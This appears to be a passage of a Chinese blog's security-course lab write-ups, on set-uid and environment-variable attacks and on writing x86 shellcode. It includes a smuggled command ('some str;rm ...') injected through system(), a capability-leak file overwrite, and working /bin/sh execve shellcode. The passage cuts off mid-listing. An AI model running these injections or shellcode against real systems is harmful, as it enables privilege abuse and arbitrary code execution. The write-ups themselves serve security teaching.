class="code"><pre><code class="hljs c"><span class="hljs-comment">/* myprog.c */</span><br><span class="hljs-meta"># <span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.7.3.jpg" class=""><h2 id="7-2-在四种场景下运行myprog">7.2 在四种场景下运行myprog</h2><ol><li>在普通用户下运行myprog，执行的是上面编写的sleep函数。因为在该场景下，设置LD_PRELOAD、和执行myprog的为同一个用户seed，因此程序运行时子进程继承了父进程的环境变量，动态链接库中有恶意sleep函数功能的链接。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.7.4.jpg" class=""><ol start="2"><li>将myprog设置为特权程序，在普通用户模式下运行，这次的sleep函数执行的是原来的sleep，等待一秒后结束。因为在seed用户下运行特权程序，即EUID和RUID不一致，所以在动态链接库的保护机制下，LD_PRELOAD将会被忽略，因此sleep是原来的sleep。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.7.5.jpg" class=""><ol start="3"><li>myprog为特权程序，在root用户下设置LD_PRELOAD变量，以root身份运行，执行的是恶意sleep。接着以普通用户身份运行时，再次运行，此时执行的sleep是正常的sleep，等待一秒后退出。在这种场景下，设置LD_PRELOAD和运行myprog的用户都为root，所以root用户运行myprog时的EUID和IUID一致，子进程继承了设置的LD_PRELOAD，执行恶意sleep。但是切换到seed用户时，由于EUID和RUID不一致，因此忽略LD_PRELOAD，执行了sleep的休眠功能。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.7.6.jpg" class=""><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.7.7.jpg" class=""><ol start="4"><li><p>新增用户user1，使myprog的所有者为user1，同时设置环境变量。然后再seed用户下再次执行myprog，sleep执行休眠功能。myprog的所有者为user1，当seed用户运行myprog时，同样由于保护机制的限制而执行的是sleep函数的休眠功能。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> useradd userq1<br><span class="hljs-attribute">sudo</span> chown user1 myprog<br><span class="hljs-attribute">sudo</span> chmod <span class="hljs-number">4755</span> myprog<br><span class="hljs-attribute">export</span> LD_PRELOAD=./libmylib.so.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.7.8.jpg" class=""><h1>Task 8: Invoking External Programs Using system() versus execve()</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">char</span> *v[<span class="hljs-number">3</span>];<br>    <span class="hljs-type">char</span> *command;<br>    <span class="hljs-keyword">if</span>(argc &lt; <span class="hljs-number">2</span>) <br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please type a file name.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    v[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/cat&quot;</span>; v[<span class="hljs-number">1</span>] = argv[<span class="hljs-number">1</span>]; v[<span class="hljs-number">2</span>] = <span class="hljs-literal">NULL</span>;<br>    command = <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">0</span>]) + <span class="hljs-built_in">strlen</span>(v[<span class="hljs-number">1</span>]) + <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">sprintf</span>(command, <span class="hljs-string">&quot;%s %s&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>]);<br>    <span class="hljs-comment">// Use only one of the followings.</span><br>    system(command);<br>    <span class="hljs-comment">// execve(v[0], v, NULL);</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>编译catall.c，并使编译后的程序为set-uid程序。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.8.1.jpg" class=""><ol start="2"><li>在root用户下创建文件夹task8_dir，并新建文件hello.c</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.8.2.jpg" class=""><ol start="3"><li>在seed用户身份下试图删除由root用户创建的hello.c，发现无法删除，因为普通用户seed的权限不足。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.8.3.jpg" class=""><ol start="4"><li>返回上一级目录，利用catall程序，传入命令“some str;rm task8_dir/hello.c”，执行后发现root的 hello.c文件被成功删除。分析原因：catall.c中将接收到的命令进行简单的拼接，也就是说最后传递给system的命令为“/bin/cat some str;rm task8_dir/hello.c”，相当于有两个命令交给system去执行。而catall为特权程序，所以它可以删除root创建的文件，因此seed普通用户通过这种方式实现了对文件的删除。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.8.4.jpg" class=""><ol start="5"><li>将处理命令的函数换成execve，参数不变，但是这次却无法将root的hello.c文件删除。分析原因：与system不同的是，execve不调用shell，不会继承原来的环境变量，接收到的参数不会像system一样当成命令，而仅仅是一个字符串。所以传入的命令被当成需要读取的文件名，因此无法执行删除操作。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.8.5.jpg" class=""><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.8.6.jpg" class=""><h1>task9 Capability Leaking</h1><p>示例代码打开了一个文件，但是没有关闭这个文件，并且使用setuid()降低了权限，因此存在有权限泄露的问题。若文件标识符被利用，且打开的这个文件为特权程序，则可以利用泄露的权限以普通用户的身份操作特权文件。</p><ol><li><p>以root身份创建文件夹etc和文件zzz（内容为“task9”），然后设置权限为0644，即普通用户无法写入内容。</p><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.9.5.jpg" class=""></li><li><p>修改示例代码。修改打开的文件为所创建的root权限文件zzz，执行的操作为获取未关闭的文件的标识符，写入内容“Malicious Data”。</p><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.9.4.jpg" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> fd;<br>  <span class="hljs-type">char</span> *v[<span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Assume that /etc/zzz is an important system file,</span><br><span class="hljs-comment">   * and it is owned by root with permission 0644.</span><br><span class="hljs-comment">   * Before running this program, you should create</span><br><span class="hljs-comment">   * the file /etc/zzz first. */</span><br>  fd = open(<span class="hljs-string">&quot;/home/seed/Desktop/lab/lab6/Labsetup/etc/zzz&quot;</span>, O_RDWR | O_APPEND);        <br>  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot open /etc/zzz\n&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// Print out the file descriptor value</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd is %d\n&quot;</span>, fd);<br><br>  <span class="hljs-comment">// Permanently disable the privilege by making the</span><br>  <span class="hljs-comment">// effective uid the same as the real uid</span><br>  setuid(getuid());                                <br><br>  <span class="hljs-comment">// Execute /bin/sh</span><br>  <span class="hljs-comment">//v[0] = &quot;/bin/sh&quot;; v[1] = 0;</span><br>  <span class="hljs-comment">//execve(v[0], v, 0);</span><br>  <span class="hljs-keyword">if</span>(fork())&#123;<br>  close(fd);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  write(fd,<span class="hljs-string">&quot;Malicious Data\n&quot;</span>,<span class="hljs-number">15</span>);<br>  close(fd);<br>  &#125;            <br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>编译cap_leak.c，把它设置为set-uid程序。</p><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.9.2.jpg" class=""></li><li><p>运行cap_leak，然后查看zzz文件的内容，发现指定字符串被写入文件中。</p><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.9.6.jpg" class=""></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab5-shellcode编写</title>
    <link href="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/"/>
    <url>/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h1>1 实验题目</h1><p>编写shellcode有几个挑战，一个是确保二进制文件中没有0x00，另一个是找出命令中使用的数据的地址。第一个挑战不是很难解决，有几种方法可以解决它。第二个挑战的解决方案导致了编写外壳代码的两种典型方法。<u>在一种方法中，数据在执行期间被推入堆栈，因此可以从<strong>堆栈指针</strong>获得它们的地址。在第二种方法中，数据存储在<strong>代码区域</strong>中，就在调用指令之后，因此在调用<strong>调用函数</strong>时，其地址被推入堆栈（作为返回地址）。</u>两种解决方案都非常优雅，我们希望学生能够学习这两种技术。</p><h1>2 实验步骤及结果</h1><p>异或：避免代码中出现出现0的问题而导致程序运行终止</p><h2 id="2-1-Task1-a">2.1 Task1.a</h2><p><strong>mysh.s说明</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>global _start<br>_start:<br>; Store the argument string on stack<br>xor eax, eax    ;eax=0<br>push eax; Use 0 to terminate the string<br>push &quot;//sh&quot; ; ➊<br>push &quot;/bin&quot;<br>mov ebx, esp ; Get the string address<br><br>; Construct the argument array argv[]<br>push eax ; argv[1] = 0 ➋<br>push ebx ; argv[0] points to the cmd string ➌<br>mov ecx, esp ; Get the address of argv[]<br><br>; For environment variable<br>xor edx, edx ; No env variable ➍<br><br>; Invoke execve()<br>xor eax, eax ; eax = 0x00000000<br>mov al, 0x0b ; eax = 0x0000000b<br>int 0x80<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/a.jpg" class=""><ol><li><strong>编译mysh.s</strong></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> nasm <span class="hljs-operator">-f</span> elf32 mysh.s <span class="hljs-literal">-o</span> mysh.o<br></code></pre></td></tr></table></figure><p>-f elf32选项表示我们希望将代码编译为32位ELF二进制格式。可执行文件和可链接格式（ELF）是用于可执行文件、对象代码、共享库的通用标准文件格式。</p><ol start="2"><li><strong>链接，生成二进制文件，得到可执行代码mysh</strong></li></ol><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">$ <span class="hljs-keyword">ld</span> -m elf_i386 mysh.o -o mysh<br></code></pre></td></tr></table></figure><p>一旦我们得到了对象代码mysh.o，如果我们想生成可执行的二进制文件，我们就可以运行链接器程序ld，这是编译的最后一步。</p><p>-m elf i386选项意味着生成32位的elf二进制文件。在这一步之后，我们将得到最终的可执行代码mysh。如果我们运行它，我们就可以得到一个shell。</p><p>在运行mysh之前和之后，我们使用<code>echo $$</code>打印出当前外壳的进程id，因此我们可以清楚地看到，mysh确实启动了一个新的外壳。</p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102211643919.png" class=""><ol start="3"><li><p><strong>获取机器码</strong></p><ul><li><p>使用objdump命令来分解可执行文件或对象文件。</p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102211709477.png" class=""></li><li><p>使用xxd命令查看文件的二进制内容。</p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102211727530.png" class=""></li></ul></li><li><p><strong>在攻击代码中使用shellcode</strong></p><ul><li><p><a href="http://xn--convert-116kr69m.py">修改convert.py</a></p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102211845348.png" class=""></li><li><p><a href="http://xn--convert-yx7nn24y.py">执行convert.py</a></p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102211903723.png" class=""></li></ul></li></ol><h2 id="2-2-Task1-b-Eliminating-Zeros-from-the-Code">2.2 Task1.b Eliminating Zeros from the Code</h2><ol><li><p><strong>修改mysh.s</strong></p><p>需要执行的命令为“/bin/bash”，需要把命令划分为“/bin”、“/bas”、“h”。由于程序中不能出现0，所以先用“#”对“h”进行填充，变成“h###”。由于计算机采用的是小端模式，所以接着对“h###”进行左移24位，然后再右移24位。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax <br>      push eax          ; Use 0 to terminate the string<br>      <br>      mov eax, &quot;h###&quot;<br>      shl eax, 24<br>      shr eax, 24<br>      push eax<br>      push &quot;/bas&quot;<br>      push &quot;/bin&quot;<br>      xor eax, eax<br>      mov  ebx, esp     ; Get the string address<br><br>      ; Construct the argument array argv[]<br>      push eax          ; argv[1] = 0<br>      push ebx          ; argv[0] points &quot;/bin//sh&quot;<br>      mov  ecx, esp     ; Get the address of argv[]<br>   <br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/b.jpg" class=""><ol start="2"><li><p><strong>查看机器码</strong></p><p>结果显示，满足“不存在0”的条件。</p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102212556049.png" class=""></li></ol><h2 id="2-3-Task-1-c-Providing-Arguments-for-System-Calls">2.3 Task 1.c. Providing Arguments for System Calls</h2><ol><li><p><strong>修改mysh.s</strong></p><p>对于这三个参数，每个参数都按照task1.b的方法入栈，参数之间用0分隔，然后将三个参数的地址从后往前依次入栈，最后使ecx指向第一个参数的起始位置。具体代码如下：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax <br>      push eax          ; Use 0 to terminate the string<br>      <br>      push &quot;//sh&quot;<br>      push &quot;/bin&quot;<br>      mov ebx,esp   ;argv[0]<br>      <br>      push eax<br>      mov  eax, &quot;##-c&quot;<br>      shr  eax, 16<br>      push eax<br>      xor  eax, eax<br>      mov  ecx, esp   ;argv[1]<br>      <br>      mov  eax, &quot;##la&quot;<br>      shr  eax, 16<br>      push eax<br>      xor  eax, eax<br>      push &quot;ls -&quot;<br>      mov  edx, esp  ;argv[2]<br><br>      ; Construct the argument array argv[]<br>      push eax          ; argv[1] = 0<br>      push edx          ; argv[0] points &quot;/bin//sh&quot;<br>      push ecx<br>      push ebx<br>      mov  ecx, esp     ; Get the address of argv[]<br>   <br>      ; For environment variable <br>      xor  edx, edx     ; No env variables <br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/c.jpg" class=""><ol start="2"><li><p><strong>执行mysh</strong></p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102212828152.png" class=""></li><li><p><strong>对比直接在命令行上执行命令的情况</strong></p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102212855446.png" class=""></li><li><p><strong>查看机器码，没有0，说明正确</strong></p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102212915284.png" class=""></li></ol><h2 id="2-4-Task-1-d-Providing-Environment-Variables-for-execve">2.4 Task 1.d. Providing Environment Variables for execve()</h2><ol><li><p><strong>修改mysh.s</strong></p><p>首先让环境变量入栈，再倒序将它们的地址入栈。接着是指令字符串入栈，最后是指令地址入栈。ecx指向指令地址，edx指向第一个环境变量的地址。具体代码如下：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>      ; Store the argument string on stack<br>      xor  eax, eax <br>      push eax          ; Use 0 to terminate the string<br>      <br>      mov  eax, &quot;1234&quot;<br>      push eax<br>      mov  eax, &quot;aaa=&quot;<br>      push eax<br>      mov  eax,esp   ;env[0]<br>      <br>      xor  ebx, ebx<br>      push ebx<br>      mov  ebx, &quot;5678&quot;<br>      push ebx<br>      mov  ebx, &quot;bbb=&quot;<br>      push ebx<br>      mov  ebx, esp   ;env[1]<br>      <br>      xor  ecx,ecx<br>      push ecx<br>      mov  ecx, &quot;4###&quot;<br>      shl  ecx, 24<br>      shr  ecx, 24<br>      push ecx<br>      mov  ecx, &quot;=123&quot;<br>      push ecx<br>      mov  ecx, &quot;cccc&quot;<br>      push ecx<br>      mov  ecx, esp   ;env[2]<br>      <br>      <br>      xor  edx, edx<br>      push edx       ;env[3]=0<br>      push ecx<br>      push ebx<br>      push eax<br>      <br>      ; For environment variable <br>      mov  edx, esp<br><br>      xor  eax, eax<br>      push eax<br>      <br>      push &quot;/env&quot;<br>      push &quot;/bin&quot;<br>      push &quot;/usr&quot;<br>      mov  ebx, esp     ; Get the string address<br>      <br>      xor  eax, eax<br>      push eax<br><br>      ; Construct the argument array argv[]<br>      push ebx          ; argv[0] points &quot;/usr/bin/env&quot;<br>      mov  ecx, esp     ; Get the address of argv[]<br><br>      ; Invoke execve()<br>      xor  eax, eax     ; eax = 0x00000000<br>      mov   al, 0x0b    ; eax = 0x0000000b<br>      int 0x80<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/task2.jpg" class=""><ol start="2"><li><p><strong>编译执行</strong></p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/image-20230102213242622.png" class=""></li></ol><h2 id="2-6-Task-2-Using-Code-Segment">2.6 Task 2: Using Code Segment</h2><ol><li><strong>解释部分代码的含义</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">section .text<br>  global _start<br>    _start:<br>BITS 32<br>jmp short two<br>    one:<br> pop ebx               ; 1<br> xor eax, eax          ; 2<br> mov [ebx+7], al       ; 3<br> mov [ebx+8], ebx      ; 4<br> mov [ebx+12], eax     ; 5<br> lea ecx, [ebx+8]      ; 6<br> xor edx, edx          ; 7<br> mov al,  0x0b         ; 8<br> int 0x80              ; 9<br>     two:<br> call one              ; 10<br> db &#x27;/bin/sh*AAAABBBB&#x27; ; 11<br></code></pre></td></tr></table></figure><p>1：栈顶指向字符串，“pop ebx”将栈顶esp指向的地址赋给ebx；</p><p>2：使用异或使eax置零；</p><p>3：将一个al存储的一个字节的0值赋给ebx+7指向的地址，使”*“处的值为0；</p><p>4：将ebx的值赋给ebx+8指向的内存地址，即替换”AAAA“；</p><p>5：将eax的值赋给ebx+12指向的内存地址，即用0替换”BBBB“；</p><p>6：ecx=ebx+8；</p><p>7：使edx置零；</p><p>8：使al=0x0b；</p><p>9：使程序中断；</p><p>10：将函数one压入栈，再跳转到one函数；</p><p>11：程序跳转到one后，esp指向命令字符串，然后函数one对其进行操作。</p><p><strong>Please explain why this code would successfully execute the /bin/sh program, how the argv[] array is constructed, etc</strong></p><p>首先使用占位符为指令字符串预留一定的空间，然后然后将占位符覆盖为特定值或地址，让程序运行时能够找到指令字符串所在的位置，然后再执行。具体来说，“*”的位置置为0，标示着指令字符串的结束，“AAAA”处为指令字符串开始的位置，“BBBB”处置0，并且ecx寄存器中的值指向“AAAA”处存储的地址，因此程序可以拿到指令字符串的其实位置，找到指令的位置后就可以执行。</p><p><strong>Please use the technique from mysh2.s to implement a new shellcode, so it executes /usr/bin/env, and it prints out the following environment variables:a=11 b=22.</strong></p><p>首先使用命令字符串“<code>/usr/bin/env****AAAA****BBBBCCCC****DDDD****EEEE****</code>”进行占位，然后以字符串的地址为基址把环境变量、环境变量地址、指令字符串的地址填充到占位符中，并在其中恰当的位置填充0，具体的实现代码如下：</p><img src="/2024/02/20/Lab5_shellcode%E7%BC%96%E5%86%99/task2.3.jpg" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> global _start<br>   _start:<br>BITS 32<br>jmp short two<br>   one:<br>pop ebx               ; to &quot;/usr...&quot;<br>xor eax, eax          ; eax=0<br>mov  [ebx+12], ax;[ebx+12]=0<br><br>mov  eax, &quot;a=11&quot;;env[0]<br>mov  [ebx+16], eax<br>xor  eax, eax<br>mov  [ebx+20], eax<br><br>mov  eax, &quot;b=22&quot;;env[1]<br>mov  [ebx+24], eax<br>xor  eax, eax<br>mov  [ebx+28], eax<br><br>mov  [ebx+32], ebx;to command<br>xor  eax, eax<br>mov  [ebx+36], eax;0<br><br>lea  ecx, [ebx+16]<br>mov  [ebx+40], ecx;to env[0]<br>lea  ecx, [ebx+24]<br>mov  [ebx+44], ecx;to env[1]<br>xor  eax, eax<br>mov  [ebx+48], eax;0<br><br>lea  ecx, 